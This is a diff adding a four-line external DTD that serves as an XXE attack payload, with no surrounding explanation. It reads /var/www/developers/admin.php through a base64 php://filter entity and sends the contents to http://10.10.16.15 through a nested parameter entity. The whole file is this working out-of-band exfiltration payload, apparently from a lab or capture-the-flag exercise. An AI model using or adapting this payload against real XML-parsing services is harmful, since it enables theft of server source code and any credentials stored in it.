@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/developers/admin.php'>
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.16.15/?x=%file;'>">
+%eval;
+%exfiltrate;
